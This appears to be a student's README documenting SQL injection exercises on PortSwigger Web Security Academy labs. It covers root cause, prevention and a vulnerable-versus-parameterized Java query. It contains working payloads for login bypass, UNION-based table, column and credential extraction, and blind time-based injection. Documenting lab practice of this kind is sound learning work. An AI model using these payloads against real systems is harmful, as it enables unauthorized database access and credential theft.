#  SQL Injection Attack Lab – PortSwigger Web Security Academy

This repository documents my hands-on practice of exploiting SQL Injection vulnerabilities using PortSwigger Web Security Academy. It demonstrates how improper input handling can lead to serious database compromise.

---

##  Overview

SQL Injection (SQLi) is a vulnerability that allows attackers to manipulate SQL queries by injecting malicious input. This can lead to authentication bypass, data leakage, and full database compromise.

This project covers authentication bypass, database enumeration (tables and columns), credential extraction, and HTTP request manipulation using Burp Suite.

---

##  Root Cause of SQL Injection

SQL Injection occurs when user input is directly included in SQL queries without proper validation or sanitization.

### Vulnerable Query Example
    SELECT * FROM users WHERE username = 'input' AND password = 'input';

### Malicious Input
    ' OR '1'='1

### Resulting Query
    SELECT * FROM users WHERE username = '' OR '1'='1';

This condition always evaluates to TRUE, allowing authentication bypass.

---

##  Tools Used

- Burp Suite (Proxy, Repeater, Intruder)
- Web Browser
- PortSwigger Web Security Academy

---

##  Using Burp Suite as Proxy

Burp Suite acts as an intermediary between the browser and the server.

### Steps Performed
1. Configure browser to use Burp Proxy
2. Intercept HTTP requests
3. Send to Repeater
4. Modify parameters (inject payloads)
5. Analyze responses

---

##  SQL Injection Attacks Performed

###  Authentication Bypass

Payload:
    ' OR 1=1--

Explanation:
Injected payload into login fields to bypass authentication.


---

###  Extracting Database Tables

Payload:
    ' UNION SELECT table_name, NULL FROM information_schema.tables--

Explanation:
Enumerated tables and identified sensitive tables like users.


---

###  Extracting Column Names

Payload:
    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

Explanation:
Retrieved column names such as username and password.


---

###  Extracting Credentials

Payload:
    ' UNION SELECT username, password FROM users--

Explanation:
Extracted admin credentials.


---

###  HTTP Request Interception

Explanation:
Captured and modified HTTP requests using Burp Suite.


---

##  Data Extraction Capabilities

- Database names  
- Table names  
- Column names  
- User credentials  
- Sensitive data  

---

##  Mistakes in Prepared Statements

Incorrect:
    String query = "SELECT * FROM users WHERE username = '" + user + "'";

Correct:
    PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
    stmt.setString(1, user);

---

##  Prevention Techniques

- Parameterized queries  
- Input validation  
- Least privilege  
- ORM frameworks  
- WAF  

---

##  Blind SQL Injection (Overview)

Types:
- Boolean-based  
- Time-based  

Payloads:
    ' AND 1=1--
    ' AND 1=2--
    ' AND SLEEP(5)--

---

##  Cluster Bomb Attack (Burp Intruder)

Steps:
1. Send request to Intruder  
2. Mark positions  
3. Add payload sets  
4. Select Cluster Bomb  
5. Analyze responses  

---

##  Key Learnings

- SQL Injection = full database compromise  
- Small mistakes = big impact  
- Burp Suite is essential  
- Secure coding is critical  

---

##  Disclaimer

All testing performed in PortSwigger Web Security Academy labs for educational purposes only.
is it ok to add this as single in readme?
